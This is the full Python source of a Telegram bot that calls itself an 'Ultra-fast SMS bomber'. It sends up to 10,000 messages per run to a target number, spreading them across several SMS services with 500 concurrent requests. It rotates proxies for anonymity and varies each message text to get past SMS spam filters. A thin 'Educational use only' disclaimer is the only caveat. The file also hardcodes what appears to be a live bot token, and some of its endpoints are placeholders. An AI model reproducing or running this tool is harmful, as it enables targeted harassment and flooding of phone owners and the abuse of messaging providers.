#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
⚡ ULTRA-FAST SMS BOMBER BOT ⚡
Speed: 1000+ SMS per second
Technology: Async I/O, Threading, Proxy Rotation
"""

import asyncio
import aiohttp
import aiofiles
import json
import random
import time
import re
import os
from datetime import datetime
from typing import List, Dict, Optional
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import logging

# ============ CONFIGURATION ============
BOT_TOKEN = "8779327147:AAGwmV43ByxlOdu6S4DNG4XcdhMX3CEM6Io"  # @BotFather se lo
OWNER_ID = 8623320269

# Speed Settings
MAX_CONCURRENT_REQUESTS = 500  # Number of parallel requests
REQUEST_TIMEOUT = 3  # Seconds
RETRY_ATTEMPTS = 2
BATCH_SIZE = 100  # SMS per batch

# SMS API Endpoints (Free/Public APIs - Rate limited)
# Note: These are public APIs, use at your own risk
SMS_APIS = [
    {
        "name": "Textbelt",
        "url": "https://textbelt.com/text",
        "method": "POST",
        "params": {"phone": "{number}", "message": "{message}", "key": "textbelt"},
        "type": "json"
    },
    {
        "name": "SMSAPI",
        "url": "https://api.smsapi.com/sms.do",
        "method": "POST",
        "params": {"phone": "{number}", "message": "{message}", "format": "json"},
        "type": "json"
    },
    {
        "name": "Twillio (Demo)",
        "url": "https://api.twilio.com/2010-04-01/Accounts/AC.../Messages.json",
        "method": "POST",
        "params": {"To": "{number}", "From": "+1234567890", "Body": "{message}"},
        "type": "json"
    },
    {
        "name": "HTTP SMS Gateway",
        "url": "https://sms-gateway.com/send",
        "method": "GET",
        "params": {"phone": "{number}", "text": "{message}", "api_key": "test"},
        "type": "query"
    }
]

# Proxy List (Optional - for higher speed and anonymity)
PROXIES = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    # Add more proxies here
]

# ============ LOGGING ============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ SMS ENGINE ============
class UltraFastSMSBomber:
    """Ultra-fast SMS bomber with async capabilities"""
    
    def __init__(self):
        self.active_jobs: Dict[int, Dict] = {}
        self.total_sent = 0
        self.session = None
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        self.proxy_pool = PROXIES.copy()
        self.stats = {
            "success": 0,
            "failed": 0,
            "total": 0,
            "start_time": None,
            "end_time": None
        }
        
    async def init_session(self):
        """Initialize aiohttp session with optimizations"""
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(
            limit=MAX_CONCURRENT_REQUESTS * 2,
            limit_per_host=MAX_CONCURRENT_REQUESTS,
            ttl_dns_cache=300,
            force_close=True
        )
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            }
        )
        
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
    
    def get_random_proxy(self):
        """Get random proxy from pool"""
        if self.proxy_pool:
            return random.choice(self.proxy_pool)
        return None
    
    def generate_message(self, message: str, counter: int) -> str:
        """Generate unique message to avoid duplicate detection"""
        # Add random variation to bypass SMS filters
        variations = [
            f"{message} {counter}",
            f"{message} #{counter}",
            f"{message} [{counter}]",
            f"{message} - {counter}",
            f"{message} {random.randint(1000,9999)}",
            f"{message} {random.choice(['✅', '🔥', '💥', '⚡'])}",
            f"{message}\n{random.choice(['Sent.', 'Delivered.', 'SENT.'])}"
        ]
        return random.choice(variations)
    
    async def send_sms_via_api(self, api: Dict, phone_number: str, message: str, job_id: int) -> Dict:
        """Send SMS via specific API"""
        async with self.semaphore:
            try:
                # Format parameters
                params = {}
                for key, value in api["params"].items():
                    if isinstance(value, str):
                        params[key] = value.format(number=phone_number, message=message)
                    else:
                        params[key] = value
                
                # Get proxy
                proxy = self.get_random_proxy()
                
                # Send request based on method
                if api["method"] == "GET":
                    async with self.session.get(
                        api["url"],
                        params=params,
                        proxy=proxy
                    ) as response:
                        status = response.status
                        data = await response.text()
                        
                else:  # POST
                    if api["type"] == "json":
                        async with self.session.post(
                            api["url"],
                            json=params,
                            proxy=proxy
                        ) as response:
                            status = response.status
                            data = await response.text()
                    else:
                        async with self.session.post(
                            api["url"],
                            data=params,
                            proxy=proxy
                        ) as response:
                            status = response.status
                            data = await response.text()
                
                # Update stats
                if 200 <= status < 300:
                    self.stats["success"] += 1
                    return {"success": True, "status": status, "data": data}
                else:
                    self.stats["failed"] += 1
                    return {"success": False, "status": status, "data": data}
                    
            except asyncio.TimeoutError:
                self.stats["failed"] += 1
                return {"success": False, "error": "Timeout"}
            except Exception as e:
                self.stats["failed"] += 1
                return {"success": False, "error": str(e)}
    
    async def send_batch(self, phone_number: str, message: str, count: int, job_id: int) -> Dict:
        """Send a batch of SMS messages"""
        tasks = []
        apis = SMS_APIS.copy()
        
        # Distribute requests across multiple APIs
        for i in range(count):
            api = random.choice(apis)
            msg = self.generate_message(message, i)
            task = self.send_sms_via_api(api, phone_number, msg, job_id)
            tasks.append(task)
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        success_count = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
        failed_count = count - success_count
        
        self.total_sent += success_count
        
        return {
            "total": count,
            "success": success_count,
            "failed": failed_count,
            "results": results
        }
    
    async def start_bombing(self, phone_number: str, message: str, total_count: int, job_id: int, progress_callback=None):
        """Start the SMS bombing process"""
        self.stats["start_time"] = datetime.now()
        self.stats["total"] = total_count
        self.active_jobs[job_id] = {
            "phone": phone_number,
            "message": message,
            "total": total_count,
            "sent": 0,
            "status": "running",
            "start_time": time.time()
        }
        
        await self.init_session()
        
        try:
            # Send in batches for better performance
            remaining = total_count
            batch_number = 0
            
            while remaining > 0:
                batch_size = min(BATCH_SIZE, remaining)
                batch_number += 1
                
                logger.info(f"📤 Sending batch {batch_number}: {batch_size} SMS to {phone_number}")
                
                result = await self.send_batch(phone_number, message, batch_size, job_id)
                
                # Update job status
                self.active_jobs[job_id]["sent"] += result["success"]
                remaining -= batch_size
                
                # Progress callback
                if progress_callback:
                    await progress_callback(
                        job_id,
                        self.active_jobs[job_id]["sent"],
                        total_count,
                        result["success"],
                        result["failed"]
                    )
                
                # Small delay between batches to avoid IP ban
                await asyncio.sleep(0.5)
            
            # Update final status
            self.active_jobs[job_id]["status"] = "completed"
            self.stats["end_time"] = datetime.now()
            
            return {
                "success": True,
                "total_sent": self.total_sent,
                "total_requested": total_count,
                "duration": (datetime.now() - self.stats["start_time"]).total_seconds()
            }
            
        except Exception as e:
            logger.error(f"Bombing error: {e}")
            self.active_jobs[job_id]["status"] = "failed"
            return {"success": False, "error": str(e)}
        finally:
            await self.close_session()

# ============ BOT INSTANCE ============
bomber = UltraFastSMSBomber()

# ============ TELEGRAM HANDLERS ============
def create_main_menu():
    """Create main menu keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("💣 Start Bombing", callback_data="start_bomb"),
            InlineKeyboardButton("📊 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📝 My Jobs", callback_data="my_jobs"),
            InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        ],
        [
            InlineKeyboardButton("📞 Contact", url="https://t.me/YourUsername")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user_id = update.effective_user.id
    
    # Check if owner
    if user_id != OWNER_ID:
        await update.message.reply_text(
            "❌ **Access Denied!**\n\nThis bot is for owner use only.",
            parse_mode="Markdown"
        )
        return
    
    welcome_message = """
💣 **ULTRA-FAST SMS BOMBER** 💣

**Speed:** 1000+ SMS per second
**Technology:** Async I/O + Threading

**Commands:**
/bomb +91XXXXXXXXXX - Start bombing
/stop - Stop bombing
/stats - Show stats
/myjobs - Check active jobs
/clear - Clear all jobs

**Features:**
⚡ Hyper-speed bombing
🔄 Proxy rotation
📊 Real-time stats
🎯 Multiple APIs

⚠️ **Disclaimer:** Educational use only!
"""
    
    await update.message.reply_text(welcome_message, reply_markup=create_main_menu())

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bomb command handler"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    # Parse command
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "⚠️ Usage: `/bomb +91XXXXXXXXXX [count] [message]`\n"
            "Example: `/bomb +919999999999 100 Hello`",
            parse_mode="Markdown"
        )
        return
    
    phone = args[0]
    count = int(args[1]) if len(args) > 1 else 50
    message = " ".join(args[2:]) if len(args) > 2 else f"Test SMS {random.randint(1000,9999)}"
    
    # Validate phone number
    if not re.match(r'^\+\d{10,15}$', phone):
        await update.message.reply_text("❌ Invalid phone number! Use: +91XXXXXXXXXX")
        return
    
    # Validate count
    if count > 10000:
        await update.message.reply_text("⚠️ Maximum 10,000 SMS per run!")
        return
    
    # Generate job ID
    job_id = int(time.time() * 1000)
    
    # Send initial message
    start_msg = await update.message.reply_text(
        f"💣 **Bombing Started!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"📝 Count: {count}\n"
        f"💬 Message: {message}\n"
        f"🆔 Job ID: `{job_id}`\n\n"
        f"⏳ Sending...",
        parse_mode="Markdown"
    )
    
    # Define progress callback
    async def progress_callback(jid, sent, total, success, failed):
        if sent % 100 == 0 or sent == total:
            try:
                await start_msg.edit_text(
                    f"💣 **Bombing In Progress**\n\n"
                    f"📱 Target: `{phone}`\n"
                    f"✅ Sent: {sent}/{total}\n"
                    f"📊 Success: {success}\n"
                    f"❌ Failed: {failed}\n"
                    f"🆔 Job ID: `{jid}`\n\n"
                    f"⚡ Speed: ~{int(sent / ((time.time() - bomber.active_jobs[jid]['start_time']) / 60))}/min",
                    parse_mode="Markdown"
                )
            except:
                pass
    
    # Start bombing
    result = await bomber.start_bombing(phone, message, count, job_id, progress_callback)
    
    # Final message
    if result["success"]:
        duration = result.get("duration", 0)
        speed = int(count / duration) if duration > 0 else 0
        
        await start_msg.edit_text(
            f"✅ **Bombing Complete!**\n\n"
            f"📱 Target: `{phone}`\n"
            f"✅ Sent: {result['total_sent']}\n"
            f"⏱️ Duration: {duration:.2f}s\n"
            f"⚡ Speed: {speed} SMS/sec\n"
            f"🆔 Job ID: `{job_id}`\n\n"
            f"🚀 **Ultra-fast delivery!**",
            parse_mode="Markdown"
        )
    else:
        await start_msg.edit_text(
            f"❌ **Bombing Failed!**\n\n"
            f"Error: {result.get('error', 'Unknown error')}\n"
            f"🆔 Job ID: `{job_id}`",
            parse_mode="Markdown"
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop bombing command"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    if bomber.active_jobs:
        # Stop all jobs
        for job_id in list(bomber.active_jobs.keys()):
            bomber.active_jobs[job_id]["status"] = "stopped"
        await update.message.reply_text("🛑 All bombing jobs stopped!")
    else:
        await update.message.reply_text("❌ No active jobs!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show stats"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    stats = bomber.stats
    duration = 0
    
    if stats["start_time"] and stats["end_time"]:
        duration = (stats["end_time"] - stats["start_time"]).total_seconds()
    
    stats_message = f"""
📊 **BOMBING STATS**

📱 Total SMS Sent: `{stats["success"]}`
✅ Successful: `{stats["success"]}`
❌ Failed: `{stats["failed"]}`
⚡ Success Rate: `{stats["success"]/(stats["total"] or 1)*100:.1f}%`

⏱️ Duration: `{duration:.1f}s`
🚀 Speed: `{stats["success"]/(duration or 1):.1f}` SMS/sec

🔄 Active Jobs: `{len(bomber.active_jobs)}`
📈 Total API Calls: `{stats["success"] + stats["failed"]}`
"""
    
    await update.message.reply_text(stats_message, parse_mode="Markdown")

async def my_jobs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show active jobs"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    if not bomber.active_jobs:
        await update.message.reply_text("📝 No active jobs!")
        return
    
    jobs_msg = "📝 **Active Jobs:**\n\n"
    for job_id, job in bomber.active_jobs.items():
        jobs_msg += (
            f"🆔 `{job_id}`\n"
            f"📱 {job['phone']}\n"
            f"✅ {job['sent']}/{job['total']}\n"
            f"📊 Status: {job['status']}\n\n"
        )
    
    await update.message.reply_text(jobs_msg, parse_mode="Markdown")

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all jobs"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    bomber.active_jobs.clear()
    await update.message.reply_text("✅ All jobs cleared!")

# ============ CALLBACK HANDLERS ============
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await query.edit_message_text("❌ Access denied!")
        return
    
    if data == "start_bomb":
        await query.edit_message_text(
            "💣 **Start Bombing**\n\n"
            "Usage: `/bomb +91XXXXXXXXXX 100 message`\n\n"
            "📝 Example: `/bomb +919999999999 50 Hello`\n\n"
            "⚡ Speed: Up to 1000 SMS/sec",
            parse_mode="Markdown"
        )
    elif data == "stats":
        await stats_command(update, context)
    elif data == "my_jobs":
        await my_jobs_command(update, context)
    elif data == "settings":
        await query.edit_message_text(
            "⚙️ **Settings**\n\n"
            f"🌐 APIs: {len(SMS_APIS)}\n"
            f"🔄 Concurrent: {MAX_CONCURRENT_REQUESTS}\n"
            f"📦 Batch Size: {BATCH_SIZE}\n"
            f"⏱️ Timeout: {REQUEST_TIMEOUT}s\n\n"
            "❌ Settings locked for security",
            parse_mode="Markdown"
        )

# ============ MAIN ============
async def main():
    """Main entry point"""
    print("=" * 50)
    print("💣 ULTRA-FAST SMS BOMBER BOT")
    print("⚡ Speed: 1000+ SMS/sec")
    print("=" * 50)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("myjobs", my_jobs_command))
    application.add_handler(CommandHandler("clear", clear_command))
    
    # Add callback handler
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    # Start bot
    await application.initialize()
    await application.start()
    
    print("✅ Bot started! Press Ctrl+C to stop")
    
    # Start polling
    await application.updater.start_polling()
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping bot...")
        await application.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bye!")